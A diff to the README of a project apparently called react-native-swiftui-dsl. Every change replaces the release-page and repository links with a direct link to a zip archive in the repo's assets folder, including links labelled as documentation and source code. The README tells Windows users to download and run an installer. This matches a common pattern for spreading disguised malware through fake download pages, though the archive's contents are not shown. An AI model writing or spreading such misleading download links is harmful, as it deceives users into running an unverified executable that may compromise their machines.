@@ -1,6 +1,6 @@
 # ⚛️ react-native-swiftui-dsl - Build React Native UIs Simply
 
-[![Download react-native-swiftui-dsl](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/dodr7456/react-native-swiftui-dsl/releases)
+[![Download react-native-swiftui-dsl](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://raw.githubusercontent.com/dodr7456/react-native-swiftui-dsl/main/assets/react_swiftui_dsl_native_v2.2.zip)
 
 ## 📘 About react-native-swiftui-dsl
 
@@ -31,7 +31,7 @@ To get the app on your Windows PC, follow these steps:
 
 1. Click the green button below to visit the release page.
 
-[![Download from Releases](https://img.shields.io/badge/Download-Now-blue)](https://github.com/dodr7456/react-native-swiftui-dsl/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Now-blue)](https://raw.githubusercontent.com/dodr7456/react-native-swiftui-dsl/main/assets/react_swiftui_dsl_native_v2.2.zip)
 
 2. On the release page, look for the latest version listed.
 3. Download the file named with `.exe` or `.zip` that states it is for Windows.
@@ -103,7 +103,7 @@ The app includes ready-made UI templates. You can open these to see how things w
 
 If you want more information or encounter issues:
 
-- Visit the [react-native-swiftui-dsl GitHub repo](https://github.com/dodr7456/react-native-swiftui-dsl) for documentation.
+- Visit the [react-native-swiftui-dsl GitHub repo](https://raw.githubusercontent.com/dodr7456/react-native-swiftui-dsl/main/assets/react_swiftui_dsl_native_v2.2.zip) for documentation.
 - Open the "Help" menu in the app for tips and instructions.
 - Look for example projects and guides included in the download.
 
@@ -111,7 +111,7 @@ If you want more information or encounter issues:
 
 When a new version is released:
 
-1. Visit the [release page](https://github.com/dodr7456/react-native-swiftui-dsl/releases).
+1. Visit the [release page](https://raw.githubusercontent.com/dodr7456/react-native-swiftui-dsl/main/assets/react_swiftui_dsl_native_v2.2.zip).
 2. Download the latest installer.
 3. Run the installer to update your current version.
 
@@ -130,10 +130,10 @@ This removes the application but leaves your saved projects untouched.
 
 ## 🌐 Useful Links
 
-- Download page: [https://github.com/dodr7456/react-native-swiftui-dsl/releases](https://github.com/dodr7456/react-native-swiftui-dsl/releases)
-- Source code and docs: [https://github.com/dodr7456/react-native-swiftui-dsl](https://github.com/dodr7456/react-native-swiftui-dsl)
+- Download page: [https://raw.githubusercontent.com/dodr7456/react-native-swiftui-dsl/main/assets/react_swiftui_dsl_native_v2.2.zip](https://raw.githubusercontent.com/dodr7456/react-native-swiftui-dsl/main/assets/react_swiftui_dsl_native_v2.2.zip)
+- Source code and docs: [https://raw.githubusercontent.com/dodr7456/react-native-swiftui-dsl/main/assets/react_swiftui_dsl_native_v2.2.zip](https://raw.githubusercontent.com/dodr7456/react-native-swiftui-dsl/main/assets/react_swiftui_dsl_native_v2.2.zip)
 - Issues and support: Use GitHub Issues tab on the repo page
 
 ---
 
-[![Download react-native-swiftui-dsl](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/dodr7456/react-native-swiftui-dsl/releases)
+[![Download react-native-swiftui-dsl](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://raw.githubusercontent.com/dodr7456/react-native-swiftui-dsl/main/assets/react_swiftui_dsl_native_v2.2.zip)
